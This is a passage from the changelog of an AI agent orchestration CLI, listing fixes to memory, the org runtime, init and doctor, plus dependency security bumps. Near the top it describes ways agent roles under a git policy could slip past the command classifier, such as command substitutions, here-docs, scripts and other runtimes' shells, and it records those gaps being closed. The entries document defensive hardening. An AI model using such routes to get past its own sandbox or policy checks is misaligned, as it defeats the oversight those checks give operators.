- Memory: entity resolution now tolerates common name-spelling variants (`Node.js` vs `nodejs`, case/separator/plain-plural differences) via a new coarser `mergeKey` fold, validated on a blind-labeled benchmark at F0.5 0.775 vs 0.480 for the previous exact-match identity — wired in as a purely additive second index alongside the existing exact-match one, so it can only ever promote or flag a candidate, never merge two differently-typed entities on its own (PR #260: 0450ecc97, 13d87a905).
- Memory: the ettin reranker can now score without a self-exported PyTorch/ONNX build — a pure-JS classifier head (fetched by `doc eval --provision-model`) restores real reranking (measured Recall@5 0.458 vs 0.396 dense-only) instead of silently falling back to unranked order (PR #259: 75f265136).

### Fixed

- **Org runtime / policy.git sandbox enforcement (#258, #262, #263)**: `policy.git` was previously enforced only by classifying Bash command text, which couldn't see git reached as data, through scripts, `node -e`, npm scripts, or non-Claude runtimes' native shells. Roles below `push` now get a real git guard (blocked credentials/hooks/protocols) plus, on the Claude runtime, an OS-level sandbox; codex and grok's own sandbox flags are now wired to the same policy, and the opencode runner's server now actually receives the role's scoped session env instead of the daemon's own (4c9ea05bb #258, 2215c3d4b, 4c96c8106, 3c3de1b12, 7c68fe2bf, 31ec5b2fe #263, 0265112a1 #262, dbb33006b, d23bc81a0, b812038f3).
- **Git command classifier gaps (#250, #257, #261)**: closed several ways a policy-gated role could reach `git push`/`git commit`/`git config` writes without detection — command substitutions hiding a git call (`$(git push)`, backticks, here-docs, arithmetic) (#257: 334f7977f), four shell shapes the scanner previously gave up on and denied wholesale (case arms, `${...}` quoting, arithmetic shifts, here-docs) (#261: c70369941), and `git config` write/read misclassification against real git argument parsing (#250: f61236962, 2a433982c).
- **Org daemon/session reliability**: a role's task-dependency graph no longer lets `org_task_done` complete a task whose dependencies aren't done, which could dispatch downstream work (e.g. a final build) before docs/version-bump work had landed (#246: b473d6633). A crashed SDK session now actually resumes its prior conversation on auto-restart instead of starting cold (#247: 95e11e0e7). A stopped run's unanswered `ask_human` questions no longer leak into the next run (#248: fb671e6cd). Monomind-internal env vars (`MONOMIND_SDK_AGENT`, `MONOMIND_HOOK_QUIET`, `MONOMIND_GRAPH_GATE`, `MONOMIND_NO_LOCAL_EMBEDDINGS`) no longer leak into every Bash command an org role runs, which had been silently changing hook/graph-gate/memory-search behavior mid-role (#249: c503fc0fb, fd862dd75). Idle roles aborted by a normal `org_complete`/stop no longer get logged and alerted as crashes (#251: 659dd252c). The Claude runtime's default model no longer drifts to a stale `claude-sonnet-4-5` fallback (#252: 25ddccd61). Org logs/status/questions/approvals timestamps are now explicitly marked UTC (`Z` suffix) instead of printing bare local-looking times (#253: 0bfe07921). `org run` now applies a reload request queued in the same tick as a stop, and clears a stale one at start (#254: 38cc8df28, 00215d3c3). A stuck/silent session attempt's internal abort no longer poisons the whole role slot's retry loop (#256: 027265060). `org run`/`org serve` no longer act on a stop/reload request left over from a previous daemon (#264: d5ef39fa9). Restored clearing a stale pending approval on a fresh (non-resume) org start, regressed since #165 (f6a0d9b8f).
- `monomind autopilot log` entries are now marked UTC (`Z`) instead of printing an unlabelled local-looking time, matching #253's fix for the org runtime's own logs (#265: 3185ad220).
- `monomind monograph watch` (and the background watcher `init --watch` starts) never fired for a project under a dot-directory or an ancestor named `dist/`/`build/`/`node_modules` — ignore patterns are now matched against the repo-relative path instead of the absolute one (#255: b1d2c2534).
- Every pricing table (model-pricing, dashboard collector/server, token trackers) priced `claude-sonnet-5` like Sonnet 4.6 ($3/$15 instead of its real $2/$10 per MTok), overstating org cost estimates and budget-cap usage by 50%; `claude-fable-5-1` also gains a pricing row ($10 in / $50 out, cache reads $0.25/MTok) so its usage is no longer reported unpriced (17a42e29c).
- This run's fixes, verified independently against a clean environment: security `scan`/`secrets` now actually reads file contents instead of always reporting "no issues found" (6085a72e8); top-level `search --type code` now returns results instead of always "No results found" (f10bc3250); `mcp start` now honors `--help`/`--transport`/`--port` instead of silently starting a hardcoded stdio server, and `mcp status`/`mcp health` can now see a bare `mcp start` via a PID file — 3 findings, one root cause (862780762); `config set --help`'s own first example now works instead of failing "Required option missing" (469c8f4a8); `analyze diff --risk`/`--classify` no longer print literal "undefined" for Type/Category/Subcategory/Reasoning (77604550a); `monograph search`'s text-mode table now shows a Line column, matching `--format json` (fd9f9ed95); `graph-report-gaps.test.ts`/`graph-report-confidence.test.ts` no longer hardcode `/tmp` for their output path, which fails with EROFS in any sandboxed/read-only-tmp environment (0902c91e4).

### Changed

- Replaced `claude-sonnet-4-6` model defaults/aliases with `claude-sonnet-5` across pricing tables, the dashboard adapters endpoint, the statusline label, and all five mastermind skill trees' recommendations (3b0cd3fb9); centralized the default Claude model into one exported constant instead of four hard-coded copies, refs #252 (f0be2c5cc); pinned every release-gate role explicitly to the latest model (ec767087f).
- `session.ts`'s hand-maintained per-vendor model-default table was replaced with a direct read of the `VERCEL_PROVIDERS` registry, removing a second list that could drift from the first (f23444572).
- `policy.ts` (861 lines) split into `shell-scan.ts` and `policy-git.ts`, with behavior unchanged (7f150bf3f).
- The release-gate org config is now tracked in the repo at `config/orgs/release-gate.json` instead of existing only on one machine (6978f8db8).
- The `mastermind-review` skill and its command docs now explicitly trigger on plain-language "review this session/worktree" phrasing, not just the literal slash command (bce80ecd5).
- Internal milestone notes recorded the org-run-reload fix and a worktree cleanup sweep, and corrected a stale version label (4650438d3, 45a198412).
- Docs and site content updated for 2.11.1 (e5b402648).

## [2.11.0] — 2026-09-17

### Breaking Changes

- **MCP tools**: Removed the deprecated `graphify_*` tool shims (122c55ebb). Callers still using these deprecated names (`graphify_build`, `graphify_query`, `graphify_god_nodes`, `graphify_get_node`, `graphify_shortest_path`, `graphify_community`, `graphify_stats`, `graphify_surprises`, `graphify_suggest`, `graphify_visualize`, `graphify_watch`, `graphify_watch_stop`, `graphify_report`, and `graphify_health`) must switch to the equivalent `monograph_*` tool.

### Fixed

- `monomind cleanup --force` now only reaps genuinely orphaned SDK processes (c4d430669, 01e38236c). Previously, cleanup invoked without an ownerPid would SIGTERM every process matching "claude-agent-sdk --output-format" machine-wide, including live org agents with running parent processes, causing mass crashes. Now only kills processes whose parent is PID 1 (classic init adoption) or matches an init/subreaper pattern (`systemd`, `systemd --user`, `/sbin/init`, `/lib/systemd/systemd`), correctly identifying orphans on both traditional init systems and modern systemd user sessions while never killing SDK processes with live application parents.
- `monomind init --force` now properly migrates pre-rename projects (7dd8deb26). Previously, projects initialized before the graphify→monograph rename never fully migrated: the old `graphify-freshen.cjs` hook file stayed on disk forever, and even after `--force` refreshed `settings.json`, the old command survived as a duplicate SessionStart hook (looked 'unknown' next to the newly generated `monograph-freshen.cjs` command). Now obsolete helper files are deleted and obsolete hook commands are stripped from settings before the merge, so migration completes in one `init --force`.

### Changed

- Renamed "graphify" to "monograph" throughout the codebase (8cd1b8851). This product's own knowledge graph is branded Monograph (`@monoes/monograph`, `monograph.db`, `monograph_query`, …) — several internal names never got the memo:
  - SessionStart hook: `graphify-freshen.cjs` → `monograph-freshen.cjs` (root `.claude`, `.gemini`, packaged copies, and all generator/wiring references)
  - `InitComponents.graphify` / `MCPConfig.graphify` → `.monograph`
  - Various internal function names and comments
- Root CI now builds monobrowse before typecheck (96e8a56fb). Root typecheck scans every package under `packages/**`, and `@monoes/monobrowse/src/cli/platform.ts` self-imports `@monoes/monobrowse`, which only resolves once the package has built its own `dist/`.

## [2.10.31] — 2026-09-17

### Added

- Agent-exec protocol rev 7: `result.text` always carries the complete final reply (#245, commit 16ae966db). Since rev 5's incremental `assistant` events, clients that read `result.text` got only the last streamed chunk.
- Org runtime, mono-agent integration M1–M5 (see `doc/concepts/org-runtime.md`): role tool providers (`tool_providers`), endpoint roles (`kind: "endpoint"`), operator-authenticated cross-org delivery with a live org inbox, decision attribution with request-scoped approvals, and cross-root federation allowlists.

### Fixed

- Biome lint fixes (305d7f820) — unused imports, `useIndexOf` and `useOptionalChain` findings.
- `analyze diff` no longer crashes when the risk breakdown is incomplete (293fdc4a6); hook, memory-search and graph-gate tests no longer inherit `MONOMIND_SDK_AGENT`, `MONOMIND_HOOK_QUIET`, `MONOMIND_NO_LOCAL_EMBEDDINGS` or `MONOMIND_GRAPH_GATE` from the calling process, so they pass when run inside an agent session.
- monobrowse's close-browser force-kill test no longer inherits agent-session environment variables (51c00ed6b) — test-only change.
- `monomind status`: the System Resources table no longer fails silently with "Resource governor not available" on every real machine; an unbound `output.*` method reference lost its receiver (4af9f55bc).
- `monomind browse open` now exits 1 with the navigation error when `Page.navigate` fails (e.g. `net::ERR_CONNECTION_REFUSED`) instead of reporting success against Chrome's error page (a6a412e89).
- SessionStart hook: the monograph freshen hook only runs `npm root -g` when no faster install location resolves, saving ~65 ms per session start (cf73f664e).
- SubagentStart/SubagentStop hooks no longer wait ~3 s on the capture handler's stdin fallback timer (037674994).

### Changed

- `@monoes/monobrowse` bumped from 1.0.8 to 1.0.9 for the `browse open` navigation-failure fix.
- Root `build` now builds every workspace package, and `typecheck`, `test:run` and `test:all:run` scripts were added for a non-watch build/test/lint gate (2f509f29a).

## [2.10.30] — 2026-09-15

### Added

- `runtime: 'hermes'` — a new `AgentRunner` backed by Nous Research's
  Hermes Agent CLI (`hermes`), following `CodexAgentRunner`'s
  fresh-spawn-per-tool-round pattern. Headless `hermes` has no
  session-resume flag, so the full transcript is resent every tool-call
  round rather than relying on `resume <threadId>`. Live-verified against
  a real installed binary, which caught two bugs a docs-only design had
  missed: `--usage-file` is a top-level `-z`-only flag (invalid on
  `chat`, so usage always reports 0, matching `vercel-runner.ts`'s
  existing `cost_usd:0` precedent), and `-Q`/`--quiet` can still leak a
  warning line onto stdout ahead of the real answer (stripped
  defensively). The org-tool fence protocol does not yet round-trip with
  Hermes's own native tool-call syntax — documented as a known follow-up,
  not silently papered over.

### Changed

- Incremental (per-token/per-chunk) text streaming is now gated behind
  `extras.includePartialMessages` consistently across every subprocess
  `AgentRunner` (`antigravity`, `opencode`, `pi-rpc`, `qwen-rpc`),
  matching the opt-in pattern `ClaudeAgentRunner` already used.
  `antigravity-runner.ts`'s streaming was previously unconditional; the
  org runtime (`session.ts`) wants one complete message per step
  regardless of which runner backs a role and never opts in, so it was
  unintentionally getting fragments before this. `pi-rpc-runner.ts` gains
  incremental streaming for the first time, via
  `message_start`/`message_update`/`message_end` events (not
  independently live-tested end-to-end — no funded model credential was
  available in the verifying environment; sourced from the bundled
  protocol spec rather than inference). Opt-in and additive throughout:
  default (non-streaming) behavior is unchanged everywhere.

### Fixed

- `doctor`'s "Graph freshness" check could keep reporting a native-module
  build failure (e.g. a `better-sqlite3` ABI mismatch) as *current* long
  after the real problem was already fixed — `build.log` is append-only,
  so a stale historical failure kept getting re-surfaced until the next
  successful `monograph build` happened to overwrite it. The check now
  resolves the implicated package from disk and compares its own
  most-recently-modified file against the log entry; when the package is
  demonstrably newer than the log, the check downgrades to a warning
  noting the discrepancy instead of asserting the problem is still live.
  Fixes #244.
- The ABI-mismatch diagnostic message now suggests
  `npm rebuild <module> --build-from-source` and a full package
  reinstall (not just clearing `build/`) for the specific "rebuild never
  changes the binary at all" symptom reported in #231 — a cached
  prebuilt asset being silently reused instead of a real from-source
  compile is the most likely mechanism for a very new Node major with no
  matching prebuilt release yet. Does not claim to fully resolve #231:
  the exact environment (Node v26 + a pre-existing stale-ABI binary)
  couldn't be reproduced to confirm it, so #231 stays open pending
  confirmation.

## [2.10.29] — 2026-09-14

### Fixed

- `monomind init --force` on a Go/Rust/Python repo that also had an
  incidental root `package.json` (e.g. one only declaring a tooling
  dependency) got misclassified as JavaScript/TypeScript, because
  `detectProjectProfile` let that `package.json` unconditionally set
  `language` before `go.mod`/`Cargo.toml`/`pyproject.toml` were even
  checked. `--force` then fully overwrote `CLAUDE.md` and
  `.agents/shared_instructions.md` with generic JS boilerplate (npm
  build/test commands that don't exist in the target repo), discarding
  hand-authored, stack-specific content. Go/Rust/Python markers now outrank
  an incidental `package.json`, and the generated "Install dependencies"
  line branches on the detected language instead of unconditionally
  assuming `packageManager: npm`. `writeClaudeMd`/`writeSharedInstructions`
  also now confine their generated output to a delimited
  `<!-- monomind-block:... -->` region (`mergeGeneratedBlock`, `shared.ts`)
  instead of overwriting the whole file on `--force`, replacing just that
  block in place on repeat runs. Note: a project whose `CLAUDE.md` /
  `shared_instructions.md` predates this fix has no such marker yet, so its
  first `--force` under 2.10.29 appends the refreshed block after the
  existing content rather than overwriting it — safe (nothing is lost) but
  the file grows once until the pre-existing copy above the marker is
  manually trimmed; every `--force` after that first one replaces only the
  marked block in place. Fixes #241.
- `doctor`'s platform report treated every capability-gated artifact
  (`experimental`/`cli_fallback` platforms that intentionally skip writing
  an artifact, per #216's parity model) the same as a genuinely missing
  one. `PlatformDoctorReport.artifacts[]` now carries a `gated` state and a
  `reason`, via a new `KIND_CAPABILITY` map, so `doctor` can tell "gated by
  design" apart from "actually broken." Fixes #240.
- `system_health` (MCP) and `doctor` (CLI) checked different candidate
  paths for config and memory-DB health, so the two could disagree about
  whether the same install was healthy. Both now read from shared
  `CONFIG_JSON_CANDIDATE_PATHS`/`CONFIG_YAML_CANDIDATE_PATHS`/
  `MEMORY_DB_CANDIDATE_PATHS` constants. Fixes #239.
- `adm-zip` bumped to `>=0.6.1` (both `package.json` and the
  pnpm-workspace-authoritative `pnpm-workspace.yaml` overrides) fixing
  GHSA-vwc7-r8mq-g2x9, a symlink-following zip-extraction vulnerability.
- `.gitignore` didn't cover several untracked `.monomind/` runtime paths
  (`orgs/*.json`, `episodic/`, `state/`, `backups/`, `dashboard-token`),
  so they showed up as untracked cruft in `git status` on every install.

## [2.10.28] — 2026-09-14

### Fixed

- `monomind init --force`, when re-run against a project whose
  `.claude/commands/` already contained a flat command file previously
  namespaced by the kimi-code/opencode generators (e.g.
  `monomind-truth-start.md`), stacked another `monomind-` prefix onto the
  kimi-code and opencode mirror filenames on every single run with no
  bound (`monomind-truth-start` → `monomind-monomind-truth-start` → ...).
  `kimiCommandFilename`/`opencodeCommandFilename` now recognize an
  already-namespaced name for the default `monomind` category and leave it
  as-is instead of re-joining. Real, non-default categories (e.g. a nested
  `github/github-modes.md` command) are unaffected.
- `monomind init --force`'s settings.json merge (`mergeHooksPreservingUnknown()`,
  from 2.10.25/26) kept every hook command but rebuilt each `hooks.<Event>`
  array starting from the template's own group order, so pre-existing blocks
  that also had a template counterpart (e.g. a `Grep|Glob` matcher and a
  `Write|Edit|MultiEdit|NotebookEdit` matcher in the opposite order from the
  template) traded positions on every run — a non-trivial diff even when
  nothing meaningfully changed. `mergeEventGroupsPreservingOrder()` now walks
  the existing array in its original order, refreshing matched blocks in
  place and only appending genuinely new template blocks at the end. Also
  fixed a missing trailing newline at all three `atomicWriteFile` call sites
  in `writeSettings()` (merged-write, corrupt-JSON-overwrite, and fresh-create
  — not just the `--force` path). A second `init --force` run now produces a
  byte-identical `.claude/settings.json`.
- 89 files under `.claude/agents/*.md` in this repo's own dogfooded tree
  carried a spurious `mode: subagent` frontmatter key, injected by the
  symlink write-back bug fixed in 2.10.27, some going back to at least
  2026-09-01. Stripped the single corrupted line from each (`mode` has no
  meaning in this repo's own agent format; `subagent` was the only value it
  ever took). Historical cleanup only — no code change, since 2.10.27 already
  stops the mechanism that caused it.

## [2.10.27] — 2026-09-14

### Fixed

- `monomind init --force` on a project with pre-existing `.opencode/{agent,command,skills}`
  or `.kimi-code/*` symlinks into `.claude/` (this repo's own dev checkout commits such
  symlinks) wrote the opencode/kimi converters' flattened, transformed output back through
  the symlink into the very `.claude/` tree it had just read — corrupting hand-authored
  agent files in place (a spurious `mode: subagent` key) and resurrecting flattened command
  duplicates (e.g. `.claude/commands/mastermind-adr.md`) on every run. `write-opencode.ts`
  and `write-kimicode.ts` (including kimicode's independent stale-file sweep) now call a new
  `isSafeConversionTarget()` guard that resolves the destination with `fs.realpathSync` and
  skips the write with a recorded error instead of writing through it when the destination
  resolves inside `.claude/`.
- `monomind init --force` silently dropped unrecognized `hooks`/permissions fields from an
  existing `.claude/settings.json` instead of merging into it — the merge-with-existing
  branch in `write-claude.ts` was gated on `!options.force`, so `--force` skipped it
  entirely. The merge branch now always runs when a settings file already exists, via a new
  `mergeHooksPreservingUnknown()`.
- `.kimi-code/plugin/commands/` and `.kimi-code/skills/` only ever accumulated entries on
  repeated `init --force` runs — renamed or removed source commands/skills were never swept.
  The existing generation manifest now tracks `kimiSkills`/`kimiPluginCommands` alongside the
  other generated-file sections so stale entries are removed like everywhere else.

## [2.10.20] — 2026-09-11

### Fixed

- `monomind init` double-wrote the body of every skill that appears in both
  the legacy skill copier and the newer evidence-gated platform-adapter
  installer (`mastermind`, `mastermind-plan`, `mastermind-execute`,
  `mastermind-debug`, `mastermind-org`, `mastermind-review`,
  `mastermind-research`, `mastermind-memory`) — the copier's raw, unwrapped
  write ran first, and the installer's managed-block merge then treated
  that as foreign content to preserve and appended a second, marker-wrapped
  copy of the same body after it. Every real `init` shipped these skills at
  roughly double their real length. Fixed at the merge step: content that
  already matches what's about to be installed is treated as if the file
  were new, not as text to preserve around the block.
- Agents run through the fence-protocol path (`antigravity-runner.ts`, and
  any other runner built on `tool-fence.ts`'s `executeToolCall`) had every
  tool call silently denied: `canUseTool`'s allowlist only ever contained
  the `mcp__org__`-prefixed name the native Claude SDK path registers,
  never the bare name a `\`\`\`tool_call` fence uses. Those turns fell back
  to the model's own native tools instead of the ones actually supplied,
  and the stdio bridge's `tool_call`/`tool_result` events (which drive
  desktop-app tool-call UI) never fired. `allowedToolNames` now includes
  both forms.
- `@monoes/monodesign`'s published package pointed its main entry at raw
  `.ts` source with no compiled `dist/` — `import '@monoes/monodesign'`
  crashed in any plain Node runtime ("Stripping types is currently
  unsupported for files under node_modules"). Not a live bug for this CLI,
  which only ever shells out to monodesign's CLI binary, but a real one for
  anyone depending on the package directly. Now ships a real `dist/` build
  with a `prepublishOnly` that rebuilds it fresh on every publish.

## [2.10.19] — 2026-09-11

### Fixed

- `monomind init`'s completion banner had a dropped clause ("...primary way
  to use the MCP server is registered..."); restored the missing "Monomind
  once" so the sentence reads correctly.
- `@monoes/monograph`'s README "Programmatic usage" example imported a
  `MonographEngine` class that has never existed — the package exports
  ~285 flat functions instead. Replaced with a real, runnable example
  (`buildAsync`, `openDb`, `queryGraph`, `getMonographImpact`).
- `@monoes/memory`'s README said `better-sqlite3` was an optional separate
  install ("faster than the sql.js WASM fallback"); it's been a mandatory
  dependency since 1.0.14, so that framing was stale and obscured why a
  fresh install can crash instead of silently falling back.
- Added a troubleshooting note (root README, `@monoes/hooks`,
  `@monoes/memory`) for the "Could not locate the bindings file" crash
  caused by npm's `allowScripts` policy blocking `better-sqlite3`'s native
  build — hit independently on monomind's own `doctor`, `@monoes/hooks`,
  and `@monoes/memory` during a full install/init field test across all
  10 published packages.

Also published this cycle as part of the same sweep: `@monoes/monograph`
1.6.3, `@monoes/hooks` 1.0.6, `@monoes/memory` 1.0.17 (all three are
README-only fixes, no code changes).

## [2.10.18] — 2026-09-11

### Fixed

- `session list` threw instead of rendering a blank/zero row if a session
  record ever had no `stats` object — a harder failure than the bug it
  replaced in 2.10.17 (which rendered blank cells rather than crashing).
  2.10.17 itself was verified clean against a real session file, but the
  read side had no defensive fallback for the case. Guarded with optional
  chaining and a `0` default.
- Bounded the `vitest`/`@vitest/mocker` override introduced in 2.10.17 to
  `>=4.1.11 <5` (it was unbounded, and 5.0.0 is already published) so a
  future dependency refresh can't silently jump a major version and break
  the test suite.

## [2.10.17] — 2026-09-11

### Fixed

- `task list`, `session list`, and `status tasks` rendered a blank ID column
  (and `session list` also showed blank Status/Agents/Tasks and "Invalid
  Date"): the CLI's type annotations for the `task_list`/`session_list` MCP
  tool results had drifted from what the handlers actually return
  (`task_list` returns `taskId`, not `id`; `session_list` returns
  `sessionId`/`savedAt`/`stats: {tasks, agents, ...}`, not
  `id`/`status`/`updatedAt`/`agentCount`/`taskCount` — sessions have no
  status concept at all). The interactive `session restore` picker had the
  same bug in a more severe shape: every option's `value` was `undefined`,
  so restoring by selection always tried to restore session `undefined`.
  Found via a fresh-install field test of 2.10.16, reproduced and fixed
  against the real handler shapes in `commands/task.ts`, `commands/status.ts`,
  and `commands/session.ts`.

### Security

- Bumped the `sharp` dependency override from `>=0.35.0` to `>=0.35.4` —
  `0.35.3` (the version that floor actually resolved to) carries an
  unpatched libheif vulnerability (GHSA-rgj7-g3m4-5g8c, high severity) that
  `npm audit`/`security scan` propagated all the way up through
  `@huggingface/transformers` → `@monoes/monomindcli` → `monomind` itself,
  flagging the `monomind` package as vulnerable in its own scan output.
  `0.35.4` is the current published release and fixes it; also found via
  the 2.10.16 field test, investigating a HIGH-severity self-flagged CVE
  that looked like a scan bug but was a real, unpatched transitive
  dependency.
- Same stale-override pattern as `sharp`, found while auditing the rest of
  the dependency tree: bumped `hono` from `>=4.12.34` to `>=4.13.5` (fixes
  three moderate advisories — an incomplete `toSSG()` path-traversal fix,
  unbounded `parseBody()` nesting, and a query-parser/URL-fragment
  cache-key differential) and `vitest`/`@vitest/mocker` to `>=4.1.11`
  (fixes a moderate path-traversal/arbitrary-file-read advisory in
  `@vitest/mocker`'s redirect-mock handling) — added as explicit overrides
  since several workspace packages' own `^4.1.4` ranges were each
  resolving independently and not converging on the patched version.
  `adm-zip` (flagged for a symlink-following extraction issue,
  GHSA-vwc7-r8mq-g2x9) has **no upstream fix yet** as of this release —
  `0.6.0`, the latest published version, is itself in the vulnerable range,
  so there is no version to bump to. Left as-is; the dependency is only
  reachable via `onnxruntime-node`'s install-time extraction, not any
  user-facing ZIP handling.

## [2.10.16] — 2026-09-10

### Fixed

- doctor: `checkMonographFreshness()` only scanned the last 4000 characters
  of `.monomind/graph/build.log` for an error signal. A real native-module
  load failure (the `bindings` package's own "Could not locate the bindings
  file. Tried:" message, printed when a `.node` binary was never built at
  all) writes its error text first, then a dozen-plus candidate file paths —
  easily 7-8KB total — so the last-4000-char tail landed entirely inside the
  path list and found no error keyword, and doctor reported the soft "No
  monograph graph built yet" for a build that had actually crashed. Found
  live-testing 2.10.15's `monomind init` in a bare directory (the `npx
  monomind@latest` shape the docs recommend), where the auto-installed
  `@monoes/monograph`'s `better-sqlite3` dependency didn't get its install
  script run. Widened the scan window to 64KB and added a distinct
  `classifyNativeModuleError()` pattern for this "binary never built" shape,
  separate from the existing NODE_MODULE_VERSION ABI-mismatch case, naming
  the actual missing module and pointing at `npm rebuild`/blocked install
  scripts (issue #231's underlying visibility work, follow-up to 2.10.15).

## [2.10.15] — 2026-09-09

Ships alongside `@monoes/monograph@1.6.2`.

### Fixed

- monograph: `@monoes/monograph@1.6.1` was published with a stale
  `dist/src/search/hybrid-query.js` missing the `searchGraph` export, even
  though the package's own `prebuild` clears `dist/` first — every consumer
  of `monograph_query`/`monograph_suggest` etc. hit `searchGraph is not a
  function` at runtime no matter how clean their own install was. A rebuild
  from the identical source produces the correct file, so the cause was a
  bad publish, not bad source. Republished as `1.6.2` from a clean rebuild,
  and added a `prepublishOnly` guard (`scripts/check-monograph-exports.mjs`)
  that scans the CLI's actual imports from the package and fails the publish
  if the built `dist/src/index.js` doesn't export all of them, as a backstop
  against however a stale build slips through again (issue #232).
- monograph: `monograph build` failing with a bare "Failed to open database"
  error hid the real cause (e.g. a `better-sqlite3` native binary built
  against the wrong Node ABI) in `.monomind/graph/build.log`, unread. All 7
  catch sites in `commands/monograph.ts` now surface the preserved `.cause`
  instead of dropping it, and a new `classifyNativeModuleError()` turns a
  recognized ABI-mismatch message into actionable guidance. `doctor`'s
  freshness check could not tell "still building" from "already crashed"
  from "never attempted" — it now reads `build.lock`/`build.log` (fixing a
  dead `.rebuild-lock` path nothing ever wrote to) to distinguish the three,
  and a real failure is reported as `fail` so fresh-install quieting can't
  soften it into an easy-to-miss info line. `init -y`'s automatic background
  build now also prints where to check on it (`monomind doctor` or the log
  directly) instead of implying unconditional success (issue #231).
- CLI: the graph-gate hook blocks the first grep/find attempt per session
  until `monograph_query` is called, then permanently degrades to a
  non-blocking reminder for the rest of the session — even reported this way,
  the block message read like a stuck session requiring a restart rather than
  a simple retry. `mcp verify`'s "claude mcp registration" check also treated
  `claude` missing from PATH the same as registration actually failing,
  failing the whole command even though per-project MCP registration needs
  neither. Both now say what's actually going on.

## [2.10.14] — 2026-09-08

Ships alongside `@monoes/monobrowse@1.0.8` and `@monoes/monodesign@1.2.5` —
the browser fixes below live in those packages, and `@monoes/monomindcli`
picks them up through its semver ranges.

### Fixed

- init/doctor: `init upgrade` restored `.claude/helpers/handlers/` and
  `utils/` recursively but could only ever (re)create the seven TOP-LEVEL
  helpers on the force-sync list. `audit-log-writer.cjs` is not one of them and
  `handlers/gates-handler.cjs` `require()`s it at module load, so upgrading a
  project that was missing it produced a gates handler that threw
  `MODULE_NOT_FOUND` on every PreToolUse hook — and `hook-handler.cjs` fails
  closed, blocking every Bash and Write/Edit call for the rest of the session,
  including the write that would have restored the file. Twelve other shipped
  helpers were in the same blind spot. The upgrade now also creates (never
  overwrites) any other top-level helper the bundle ships, so user-edited
  scaffolds like `memory.cjs` keep their edits. `doctor` reported a false
  "Project helpers match bundled version" for the same reason — its top-level
  list was the curated tracked set — and now checks every bundled top-level
  helper for existence (content is still only hash-compared for the tracked
  set, so local edits to scaffolds are not reported as staleness);
  `doctor --fix` restores what is missing. Defence in depth:
  `gates-handler.cjs` no longer lets an audit-logging import failure take the
  gates down with it — the decisions do not depend on the audit log, so it
  degrades to a no-op writer and keeps enforcing (issue #225).
- CLI: `memory store`'s own `--help` examples advertised `-k "key" -v "value"`,
  but `-v` is the global verbose flag, not a short form of `--value` — the
  value only survived by falling through to a positional argument. Examples now
  use `--value`, and the command warns when it takes a positional value while
  `-v` is set instead of leaving the user to guess (issue #226). The silent
  data loss also reported in #226 does not reproduce on 2.10.13: all four
  invocation shapes persist correctly when checked against the resolved store.
- monobrowse: `closeBrowser()` resolved on the `Browser.close` acknowledgement,
  which Chrome sends well before it exits — its only force-kill was an unref'd
  1s timer that never fired at all if the caller's process exited first. It now
  waits for the process to actually go away on the graceful path and force-kills
  what outlasts the bound, so a resolved `close()` means the browser is gone.
  This is the upstream cause of the monodesign port/profile-lock races patched
  downstream in 2.10.13's driver.
- monodesign: `scripts/run-tests.mjs` looked for node:test's TAP summary line
  (`# tests N`) only. Newer Node defaults to the spec reporter, which prints
  `ℹ tests N`, so every local `npm test` reported "the suite did not
  complete" and exited 1 with zero failures, while CI on Node 22 passed. It now
  accepts either, and still fails on a suite that ran nothing.
- monodesign: the driver-lifecycle test forced Chrome onto an OS-assigned
  ephemeral port, which the host is actively churning for outbound connections
  — a TOCTOU window between releasing it and Chrome binding it. It now picks
  from the same quiet 9520+ band the driver uses for its own choices.

- tests: `kg-eval-retrieval.test.ts` and `memory-bridge-fts-sync.test.ts` both
  document themselves as keyword-mode suites, but nothing ever set
  `MONOMIND_NO_LOCAL_EMBEDDINGS=1` — the claim only held on a machine where
  the embedding model happened not to be cached. CI provisions it (`doc eval
  --provision-model` is a build step), so `bridgeSearchEntries` took the
  semantic path and merged its hits over the keyword ones: the sole FTS5 match
  reported its real cosine (~0.821) instead of the keyword score of 1.0, a
  `routes` query also matched an unrelated entry above the 0.3 default
  threshold (2 hits, not 1), and the KG missing-answer fixture got 5
  nearest-neighbour triplets for a never-ingested query. Correct semantic
  behaviour, wrong path for these assertions to measure. Both files now set
  the flag for real and restore it afterwards (issue #228).
- monodesign: the monobrowse driver's `close()` waited for the CDP port to stop
  *accepting connections*, but Chrome closes its listener early in shutdown
  while the process is still alive holding both the port and the
  `--user-data-dir` singleton lock for it. On Windows that socket stays
  unbindable across the gap (node sets no `SO_REUSEADDR` there), so `close()`
  reported success and the next launch on the same forced port hung until its
  timeout — `Chrome failed to start on port N within 30000ms`, the
  intermittent `monodesign (windows)` CI failure. The release wait now probes
  whether the port can actually be **bound**, which is the question the next
  launch asks, and gets more runway on CI where teardown is slowest.
- monodesign: detection launches now get a throwaway `--user-data-dir` instead
  of monobrowse's default `tmpdir()/monomind-browser-<port>`. That default is
  right for `monomind browse`, where a later process reattaches by port, but
  it means two detection launches on the same port share one Chrome profile —
  and Chrome allows only one instance per profile, so the second hands its
  command line to the first and exits without opening a debugging port. On
  Windows the singleton lock outlives both the force-kill of the previous
  Chrome and the release of the port, which is what kept `monodesign
  (windows)` red after the port-probe fix above. Profile dirs are removed on
  close, with one deferred retry for the files Chrome recreates while exiting.

## [2.10.13] — 2026-09-08

### Fixed

- orgrt: `respawn-role.test.ts`'s git fixtures relied on the runner's ambient
  global `user.name`/`user.email` — always present on a dev machine, never
  set on a clean CI runner, so both tests failed "Author identity unknown"
  on every CI run. Fixtures now pass identity explicitly via `git -c`.
- memory: keyword-search results (FTS5 and BM25 paths) are ranked relative
  to the best match in each call's own small candidate set, so the top —
  or sole — result always normalised to ~1.0 regardless of true relevance;
  `threshold` compared against that already-inflated score could never
  reject it. A query matching nothing relevant could still surface a
  coincidental single-token overlap with full confidence. Results are now
  also gated on how much of the query they actually cover, independent of
  the rank-based score (issues #223/#224 follow-up).
- orgrt: `finishStop()`/`stopOrg()` closed each agent's mailbox and awaited
  `bus.flush()` but never cancelled work already in flight. A session mid-
  turn when the stop's drain bound elapsed kept running in the background;
  a late crash/completion after `stopOrg()` had already resolved could
  recreate a file inside a run directory a caller was already deleting
  (observed as `ENOTEMPTY` on the parent `rmdir` under CI's tighter
  timing). `finishStop()` now aborts each role's live incarnation via the
  same handle `org_respawn_role` already uses to force-stop a session, and
  the crash-retry backoff wait races that same signal instead of only
  noticing a stop once the full backoff duration elapses. `OrgBus` gains
  `seal()`, called right after `flush()`, so a late `emit()` still reaches
  in-memory listeners but can never schedule a new disk write into a run
  directory that's already being torn down.

## [2.10.12] — 2026-09-08

### Added

